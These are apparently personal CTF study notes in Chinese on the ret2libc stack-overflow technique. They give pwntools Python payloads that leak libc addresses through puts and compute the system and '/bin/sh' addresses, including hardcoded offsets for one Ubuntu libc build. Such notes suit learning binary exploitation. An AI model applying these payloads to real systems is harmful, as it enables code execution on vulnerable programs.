写起来较为复杂，但是实则方法较为固化的技术？

# 原理
参见[[glibc]]

# 方法速查
## 利用目的
程序内没有包含后门，就去libc这个动态链接库里找。
## 先决条件
1. 控制栈，而且有不小的溢出空间
2. 有输出函数
3. 如果含[[保护#PIE]|PIE]]需要先泄露程序基址
## 利用
Python脚本，泄露函数为`puts`

>如果知道libc文件就只泄露一个，没有信息就泄露2个。
### 64位
#### 泄露一个的情况
```python
ll = b'a' *(0xA+8) + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['_start'])
p.sendafter(b'should I do?\n',ll)

lkPuts = u64(p.recvline().strip().ljust(8,b'\x00'))
log.success(f'puts@libc : {hex(lkPuts)}')

lcBase = lkPuts - libc.symbols['puts']
binsh = lcBase + next(libc.search(b'/bin/sh'))
syst = lcBase + libc.symbols['system']

```

#### 泄露两个的情况（也许更加常见？）
```python
ll = b'a' * 0x28
ll += p64(rdiret) + p64(elf.got['read']) + p64(elf.plt['puts'])
ll += p64(rdiret) + p64(elf.got['puts']) + p64(elf.plt['puts'])
ll += p64(elf.symbols['_start'])
p.sendlineafter(b'to do\n',ll)

lkRead = u64(p.recvline().strip().ljust(8,b'\x00'))
log.success(f'read@lbc : {hex(lkRead)}')

lkPuts = u64(p.recvline().strip().ljust(8,b'\x00'))
log.success(f'puts@lbc : {hex(lkPuts)}')

#libc6_2.35-0ubuntu3.10_amd64
syst = lkRead - 0xc3a60
binsh = lkRead + 0xc3ea8
```

### 32位
根据实际情况按照[[调用约定]]修改。